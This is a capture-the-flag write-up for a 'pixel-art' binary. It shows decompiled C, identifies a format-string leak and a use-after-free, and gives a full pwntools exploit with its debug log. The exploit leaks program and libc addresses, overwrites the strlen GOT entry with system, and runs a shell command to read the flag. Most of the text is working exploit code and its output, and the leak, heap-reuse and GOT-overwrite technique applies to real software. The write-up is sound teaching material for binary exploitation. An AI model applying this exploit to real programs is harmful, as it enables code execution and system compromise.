# pixel-art

The main function:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+4h] [rbp-2Ch]
  int j; // [rsp+8h] [rbp-28h]
  unsigned int v6; // [rsp+Ch] [rbp-24h]
  int Number; // [rsp+10h] [rbp-20h]
  int v8; // [rsp+14h] [rbp-1Ch]
  _QWORD *v9; // [rsp+18h] [rbp-18h]

  setupBuffers(argc, argv, envp);
  puts("Welcome to the CLI Pixel Art generator!");
  printf("Width of image: ");
  Number = readNumber();
  if ( Number > 0 && Number <= 51 )
  {
    printf("Height of image: ");
    v8 = readNumber();
    if ( v8 > 0 && v8 <= 51 )
    {
      v9 = malloc(8LL * v8);
      if ( !v9 )
        exit(12);
      for ( i = 0; i < Number; ++i )
      {
        v9[i] = malloc(8LL * Number);
        if ( !v9[i] )
          exit(12);
        for ( j = 0; j < v8; ++j )
          *(_QWORD *)(v9[i] + 8LL * j) = 0LL;
      }
      do
      {
        puts("1. Add new pixel\n2. Remove a pixel\n3. Edit a pixel\n4. Show board\n0. Exit");
        v6 = readNumber();
      }
      while ( v6 > 4 );
      __asm { jmp     rax }
    }
    puts("Height must be between 1 and 50");
    return 22;
  }
  else
  {
    puts("Width must be between 1 and 50");
    return 22;
  }
}
```

It’s an app where you can create ascii patterns. Nothing to overflow. Let’s maybe check for format string arbitrary write:

```c
__int64 __fastcall showBoard(__int64 a1, __int64 a2)
{
  const char *v2; // rax
  __int64 result; // rax
  int v4; // [rsp+10h] [rbp-40h]
  int i; // [rsp+14h] [rbp-3Ch]
  int j; // [rsp+18h] [rbp-38h]
  int k; // [rsp+1Ch] [rbp-34h]
  int m; // [rsp+20h] [rbp-30h]
  int v9; // [rsp+24h] [rbp-2Ch]
  int n; // [rsp+28h] [rbp-28h]
  int ii; // [rsp+2Ch] [rbp-24h]
  int v12; // [rsp+34h] [rbp-1Ch]
  char *s; // [rsp+38h] [rbp-18h]

  v4 = 2;
  for ( i = 0; i < SHIDWORD(a1); ++i )
  {
    for ( j = 0; j < (int)a1; ++j )
    {
      if ( *(_QWORD *)(*(_QWORD *)(a2 + 8LL * i) + 8LL * j) )
      {
        v12 = strlen(*(const char **)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * i) + 8LL * j) + 8LL));
        if ( v12 > v4 )
          v4 = v12;
      }
    }
  }
  for ( k = 0; ; ++k )
  {
    result = HIDWORD(a1);
    if ( k >= SHIDWORD(a1) )
      break;
    for ( m = 0; m < (int)a1; ++m )
    {
      v9 = 2;
      if ( *(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m)
        && *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m) + 8LL) )
      {
        v9 = strlen(*(const char **)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m) + 8LL));
      }
      printf("%*s", (v4 - v9) / 2, (const char *)&unk_203C);
      if ( *(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m)
        && *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m) + 8LL) )
      {
        v2 = *(const char **)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * k) + 8LL * m) + 8LL);
      }
      else
      {
        v2 = "--";
      }
      s = (char *)v2;
      for ( n = 0; n < strlen(s); ++n )
      {
        if ( s[n] == 37 )
        {
          for ( ii = n + 1; ii < strlen(s); ++ii )
          {
            if ( s[ii] == 110 )
              s = "?";
          }
        }
      }
      printf(s);
      printf("%*s", (v4 - v9) / 2, (const char *)&unk_203C);
    }
    putchar(10);
  }
  return result;
}
```

Here a vulnerable printf is used, but the existence of `%...n` is checked and removed

```c
void __fastcall removePixel(__int64 a1, __int64 a2)
{
  int Number; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("row> ");
  Number = readNumber();
  if ( Number >= 0 && Number < (int)a1 && (printf("column> "), v3 = readNumber(), v3 >= 0) && v3 < SHIDWORD(a1) )
  {
    if ( *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * Number) + 8LL * v3) + 8LL) )
      free(*(void **)(*(_QWORD *)(*(_QWORD *)(a2 + 8LL * Number) + 8LL * v3) + 8LL));
    if ( *(_QWORD *)(*(_QWORD *)(a2 + 8LL * Number) + 8LL * v3) )
      free(*(void **)(*(_QWORD *)(a2 + 8LL * Number) + 8LL * v3));
  }
  else
  {
    puts("no lol");
  }
}
```

The `removePixel` function only frees the buffers but it keeps the pointer, so this is a use after free vulnerability

The pixel looks like this:

```c
struct Pixel {
    int row;
    int column;
    char *pattern;
};
```

Idea of the exploit:

- leak main addresses using the vulnerable printf
- replace a pixel’s buffer with an address we want to read/write to: can be a GOT address (`strlen` is a good choice - it is called for every existing pixel inside `showBoard`)
- use the show board function to leak a libc address
- use the edit pixel function to modify `strlen` to `system`
- create a pixel with any command we want to execute

By creating 2 pixels with a 32 byte long pattern, freeing them, then creating another one with 19 bytes, we see that we can overwrite a previous pixel’s buffer

```python
from pwn import *

context.log_level = 'debug'

def int_to_bytestring(number):
    return str(number).encode()

def menu(*args, **kwargs):
    for arg in args:
        r.sendline(int_to_bytestring(arg))
        r.clean()
    for kwarg in kwargs.values():
        r.sendline(kwarg)          
        r.clean()

elf = ELF("./pixel-art")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
r = process("./pixel-art")
r.clean()
r.sendline(b"5")
r.clean()
r.sendline(b"5")
r.clean()
menu(1, 1, 1, 5, pattern=b"%17$p")
r.sendline(b"4")
main_leak = int(r.recvuntil(b"6e --")[:-3].split(b"0x")[1], 16)
log.success(f"main leak = {hex(main_leak)}")
main_base = main_leak - 0x1c6e
log.success(f"main base = {hex(main_base)}")
menu(1, 1, 1, 32, pattern=b"A" * 32)
menu(1, 2, 2, 32, pattern=b"B" * 32)
menu(2, 2, 2)
menu(2, 1, 1)
menu(1, 3, 3, 19, pattern=b"C" * 8 + p64(main_base + elf.got['strlen']))
r.sendline(b"4")
libc_leak = int.from_bytes(r.recvuntil(b"\x7f")[-6:], "little")
log.success(f"libc leak = {hex(libc_leak)}")
libc_base = libc_leak - 0x1b5740
log.success(f"libc base = {hex(libc_base)}")
menu(1, 0, 0, 32, pattern=b"cat flag.txt")
menu(3, 2, 2, pattern=p64(libc_base + libc.sym['system']))
r.sendline(b"4")
flag = r.recvline()
log.success(f"flag = {flag}")
```

```c
[*] '/home/toma/tfc/pixel-art/pixel-art'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './pixel-art' argv=[b'./pixel-art'] : pid 4331
[DEBUG] Received 0x38 bytes:
    b'Welcome to the CLI Pixel Art generator!\n'
    b'Width of image: '
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x11 bytes:
    b'Height of image: '
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x49 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x10 bytes:
    b'pattern length> '
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0x6 bytes:
    b'%17$p\n'
[DEBUG] Received 0x92 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0xbc bytes:
    b' --  --  --  --  -- \n'
    b' -- 0x5556f9489c6e --  --  -- \n'
    b' --  --  --  --  -- \n'
    b' --  --  --  --  -- \n'
    b' --  --  --  --  -- \n'
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[+] main leak = 0x5556f9489c6e
[+] main base = 0x5556f9488000
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x10 bytes:
    b'pattern length> '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0x21 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[DEBUG] Received 0x92 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x10 bytes:
    b'pattern length> '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0x21 bytes:
    b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n'
[DEBUG] Received 0x92 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x49 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x49 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x10 bytes:
    b'pattern length> '
[DEBUG] Sent 0x3 bytes:
    b'19\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0x11 bytes:
    00000000  43 43 43 43  43 43 43 43  68 b5 48 f9  56 55 00 00  │CCCC│CCCC│h·H·│VU··│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x49 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0xb4 bytes:
    00000000  20 20 20 20  20 20 2d 2d  20 20 20 20  20 20 20 20  │    │  --│    │    │
    00000010  20 20 20 20  2d 2d 20 20  20 20 20 20  20 20 20 20  │    │--  │    │    │
    00000020  20 20 2d 2d  20 20 20 20  20 20 20 20  20 20 20 20  │  --│    │    │    │
    00000030  2d 2d 20 20  20 20 20 20  20 20 20 20  20 20 2d 2d  │--  │    │    │  --│
    00000040  20 20 20 20  20 20 0a 20  20 20 20 20  20 2d 2d 20  │    │  · │    │ -- │
    00000050  20 20 20 20  20 43 43 43  43 43 43 43  43 68 b5 48  │    │ CCC│CCCC│Ch·H│
    00000060  f9 56 55 20  20 20 20 20  20 2d 2d 20  20 20 20 20  │·VU │    │ -- │    │
    00000070  20 20 20 20  20 20 20 2d  2d 20 20 20  20 20 20 20  │    │   -│-   │    │
    00000080  20 20 20 20  20 2d 2d 20  20 20 20 20  20 0a 20 20  │    │ -- │    │ ·  │
    00000090  20 20 20 20  2d 2d 20 20  20 20 20 20  20 20 20 20  │    │--  │    │    │
    000000a0  20 20 2d 2d  20 20 20 20  20 20 20 20  20 20 40 b7  │  --│    │    │  @·│
    000000b0  f2 de 21 7f                                         │··!·│
    000000b4
[+] libc leak = 0x7f21def2b740
[+] libc base = 0x7f21ded76000
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xfd bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 2d 2d  20 20 20 20  │    │    │  --│    │
    00000010  20 20 20 20  20 20 20 20  2d 2d 20 20  20 20 20 20  │    │    │--  │    │
    00000020  0a 20 20 20  20 20 20 2d  2d 20 20 20  20 20 20 20  │·   │   -│-   │    │
    00000030  20 20 20 20  20 2d 2d 20  20 20 20 20  20 20 20 20  │    │ -- │    │    │
    00000040  20 20 20 2d  2d 20 20 20  20 20 20 43  43 43 43 43  │   -│-   │   C│CCCC│
    00000050  43 43 43 68  b5 48 f9 56  55 20 20 20  20 20 20 2d  │CCCh│·H·V│U   │   -│
    00000060  2d 20 20 20  20 20 20 0a  20 20 20 20  20 20 2d 2d  │-   │   ·│    │  --│
    00000070  20 20 20 20  20 20 20 20  20 20 20 20  2d 2d 20 20  │    │    │    │--  │
    00000080  20 20 20 20  20 20 20 20  20 20 2d 2d  20 20 20 20  │    │    │  --│    │
    00000090  20 20 20 20  20 20 20 20  2d 2d 20 20  20 20 20 20  │    │    │--  │    │
    000000a0  20 20 20 20  20 20 2d 2d  20 20 20 20  20 20 0a 31  │    │  --│    │  ·1│
    000000b0  2e 20 41 64  64 20 6e 65  77 20 70 69  78 65 6c 0a  │. Ad│d ne│w pi│xel·│
    000000c0  32 2e 20 52  65 6d 6f 76  65 20 61 20  70 69 78 65  │2. R│emov│e a │pixe│
    000000d0  6c 0a 33 2e  20 45 64 69  74 20 61 20  70 69 78 65  │l·3.│ Edi│t a │pixe│
    000000e0  6c 0a 34 2e  20 53 68 6f  77 20 62 6f  61 72 64 0a  │l·4.│ Sho│w bo│ard·│
    000000f0  30 2e 20 45  78 69 74 0a  72 6f 77 3e  20           │0. E│xit·│row>│ │
    000000fd
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x10 bytes:
    b'pattern length> '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x49 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x5 bytes:
    b'row> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x8 bytes:
    b'column> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x9 bytes:
    b'pattern> '
[DEBUG] Sent 0x9 bytes:
    00000000  e0 aa dc de  21 7f 00 00  0a                        │····│!···│·│
    00000009
[DEBUG] Received 0x92 bytes:
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
    b'1. Add new pixel\n'
    b'2. Remove a pixel\n'
    b'3. Edit a pixel\n'
    b'4. Show board\n'
    b'0. Exit\n'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0xb bytes:
    b'FLAG{fake}\n'
[+] flag = b'FLAG{fake}\n'
[*] Stopped process './pixel-art' (pid 4331)
```